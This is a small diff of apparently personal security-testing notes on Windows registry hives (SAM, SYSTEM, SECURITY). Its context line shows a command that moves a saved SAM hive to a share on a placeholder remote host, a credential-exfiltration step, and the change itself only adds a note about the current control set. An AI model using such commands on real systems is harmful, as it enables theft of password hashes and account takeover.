@@ -34,4 +34,5 @@ move sam.save \\<hoost ip>\SHARENAME
 	- `C:\Windows\System32\config\SYSTEM`
 		-> System registry hive.
 		-> Machine-wide system config 
+		-> current control set- 
 	- `C:\Windows\System32\config\SECURITY `
